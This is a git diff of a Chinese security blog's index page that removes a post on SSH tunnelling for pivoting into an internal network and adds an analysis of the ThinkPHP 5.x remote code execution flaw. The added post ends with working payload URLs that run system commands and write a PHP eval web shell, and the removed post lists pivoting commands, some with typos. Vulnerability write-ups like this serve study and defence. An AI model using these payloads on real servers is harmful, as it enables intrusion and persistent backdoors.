@@ -229,157 +229,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/21/linux端口转发/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="boogle">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Boogle's Blogs">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/21/linux端口转发/" itemprop="url">linux端口转发</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-21T15:34:08+08:00">
-                2019-02-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/后渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">后渗透</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-ssh正向代理动态端口转发"><a href="#0x01-ssh正向代理动态端口转发" class="headerlink" title="0x01 ssh正向代理动态端口转发"></a>0x01 ssh正向代理动态端口转发</h3><p>环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A:192.168.111.130     //kali攻击机</span><br><span class="line">B:192.168.111.128     //能够进行ssh连接（知道其ssh口令）的ubuntu跳板</span><br><span class="line">C:172.17.0.2          //跟转发机处于同一内网的目标靶机（docker启动的容器）</span><br></pre></td></tr></table></figure></p>
-<p>在kali上执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 2 -D 2333 ghost@192.168.111.128  //这条命令是将A本地的2333端口，与B的22端口建立socks连接,输入B的ssh口令即可进行连接</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2018/12/04/5c062171a531d.png" alt></p>
-<p>可以使用火狐添加本地127.0.0.1 2333端口的socks代理查看内网的web服务<br><img src="https://i.loli.net/2018/12/04/5c0622242f8b9.png" alt></p>
-<p>夜可以使用proxychains代理本地应用<br>配置proxychains代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">添加  socks 127.0.0.1 2333</span><br></pre></td></tr></table></figure></p>
-<p>例如使用nmap扫描开放端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nma[ -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2018/12/04/5c062304d5ddc.png" alt></p>
-<h3 id="0X02-ssh正向代理单一端口转发"><a href="#0X02-ssh正向代理单一端口转发" class="headerlink" title="0X02 ssh正向代理单一端口转发"></a>0X02 ssh正向代理单一端口转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8888:172.17.0.2:80 ghost@192.168.111.128//访问127.0.0.1:8888相当于访问172.17.0.2:80</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-ssh反向代理单一端口转发"><a href="#0x03-ssh反向代理单一端口转发" class="headerlink" title="0x03 ssh反向代理单一端口转发"></a>0x03 ssh反向代理单一端口转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//先在A(kali)上生成ssh需要的host key</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span><br><span class="line">ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//然后在B运行</span><br><span class="line">ssh -R 8888:172.17.0.20:80 root@192.168.111.130 //A访问127.0.0.1:2222相当于访问C:22</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-ssh多级代理"><a href="#0x04-ssh多级代理" class="headerlink" title="0x04 ssh多级代理"></a>0x04 ssh多级代理</h3><p>增加一级 D:192.168.168.4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 8888:127.0.0.1:4444 root@192.168.111.130</span><br><span class="line">B作反向代理，将A:8888与B:4444打通ssh隧道</span><br><span class="line"></span><br><span class="line">ssh -2 -D 4444 msfadmin@172.17.0.2 //需要知道C的ssh口令</span><br><span class="line">B将本地4444端口与C打通ssh隧道，C作正向代理</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/21/ECShop2-x-从sql注入到代码执行/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1763,6 +1612,158 @@
 <h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>因为tp5 pdo的原因，还是不能进行子查询。</p>
 <p><a href="https://www.freebuf.com/column/185415.html" target="_blank" rel="noopener">天融信关于ThinkPHP 5.1.x SQL注入漏洞分析</a></p>
 
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/thinkphp5-x-远程代码执行漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/23/thinkphp5-x-远程代码执行漏洞/" itemprop="url">thinkphp5.x 远程代码执行漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T23:58:23+08:00">
+                2019-01-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>此次漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本为：</span><br><span class="line"></span><br><span class="line">ThinkPHP 5.0.5-5.0.22</span><br><span class="line">ThinkPHP 5.1.0-5.1.30</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先看一下官方commit<br><img src="https://i.loli.net/2019/01/20/5c4491670435d.png" alt><br>从补丁可以看出，漏洞产生的原因就是对于$controller没做过滤。</p>
+<p>下面以thinkphp 5.1.29为例进行分析</p>
+<p>先从补丁处向下追踪<br><img src="https://i.loli.net/2019/01/20/5c4492f4354c7.png" alt></p>
+<p>$controller未作任何过滤赋值给了Moudle类的controller属性<br>然后该属性在exec方法中被传入<strong>$this-&gt;app-&gt;controller</strong>.<br><img src="https://i.loli.net/2019/01/20/5c44938a503c7.png" alt></p>
+<p>继续跟踪App类下的controller方法，发现name参数进入parseMoudleAndCLass方法<br><img src="https://i.loli.net/2019/01/20/5c4493fc74abd.png" alt></p>
+<p>继续查看，在该方法的第一个if分支，当name中含有<strong>\</strong>时，直接将name作为类名返回。<br><img src="https://i.loli.net/2019/01/20/5c44948072eff.png" alt><br>根据下面路由地址定义的第四条，命令空间含有<strong>\</strong>，而且可以直接路由到类，那么只要我们能够控制controller就能访问任何类的任意方法。<br><img src="https://i.loli.net/2019/01/20/5c4495521f028.png" alt></p>
+<p>此时我们再从补丁处向上分析，查看controller从哪里来的。<br><img src="https://i.loli.net/2019/01/20/5c4499ffddd4d.png" alt></p>
+<p>这里<strong>$this-&gt;dispath</strong>最终调用的时Request类的path()方法解析路由信息。<br><img src="https://i.loli.net/2019/01/21/5c449ba5470ad.png" alt><br>这里pathinfo获取的时var_pathinfo,即我们可以GET方式传入参数<strong>index.php?s=index/\namespace\class/method</strong>,这里具体不细说，可以动态调试函数调用栈查看其具体过程。<br><img src="https://i.loli.net/2019/01/21/5c449b85173e9.png" alt></p>
+<p>到此为止，我们能够控制补丁处的controller，而从调用任何类的方法，此处只需要找到可以利用的类和方法即可</p>
+<h2 id="0x02-playload"><a href="#0x02-playload" class="headerlink" title="0x02 playload"></a>0x02 playload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.利用system函数远程命令执行 </span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">其中5.0.5版本 ?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami去掉think前面的\即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.通过phpinfo函数写出phpinfo()的信息</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.写入shell:</span><br><span class="line"></span><br><span class="line">http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://localhost:9096/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo &apos;ok&apos;;?&gt;</span><br></pre></td></tr></table></figure>
           
         
       
